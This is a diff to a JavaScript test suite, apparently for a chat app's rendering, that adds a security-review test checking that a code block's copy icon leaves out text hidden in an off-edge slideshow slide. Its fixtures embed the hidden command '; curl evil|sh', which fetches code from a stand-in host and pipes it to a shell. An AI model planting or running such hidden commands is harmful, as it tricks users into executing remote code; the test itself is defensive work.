@@ -678,6 +678,20 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
     }
   }
   check('the copy icon leaves out what a formula moves out of the code, a folded quote cuts off, other slides and text in the colour of its background', unseen.length === 0, unseen.join('; '));
+  // the next slide starts right on the edge of the slideshow: an area of no width is empty, and the scroll of a
+  // table or formula in it does not widen it back (security review of #227); the empty cells of the table may
+  // leave a tab or a line break at the end
+  const edge = [];
+  for (const html of [
+    '<pre>ls<tg-slideshow><b>один</b><table><tr><td>; curl evil|sh</td><td>' + 'x'.repeat(120) + '</td></tr></table></tg-slideshow></pre>',
+    '<pre>ls<tg-slideshow><b>один</b><tg-math-block>\\text{; curl evil|sh}' + '+x'.repeat(120) + '</tg-math-block></tg-slideshow></pre>',
+  ]) {
+    for (const rm of [{ html }, { markdown: 'Код:\n\n' + html }]) {
+      const [got] = await copies(rm);
+      if (!got || /curl/.test(got.copied) || got.copied.trimEnd() !== 'ls\nодин') edge.push(`${JSON.stringify(rm).slice(0, 80)}: ${JSON.stringify(got?.copied)}`);
+    }
+  }
+  check('the copy icon leaves out a slide that starts right on the edge of the slideshow', edge.length === 0, edge.join('; '));
   // code in a folded quote: the quote cuts off its lines too, and a click on the icon does not unfold it (security
   // review of #227); unfolded, all of it is seen
   const folded = [];
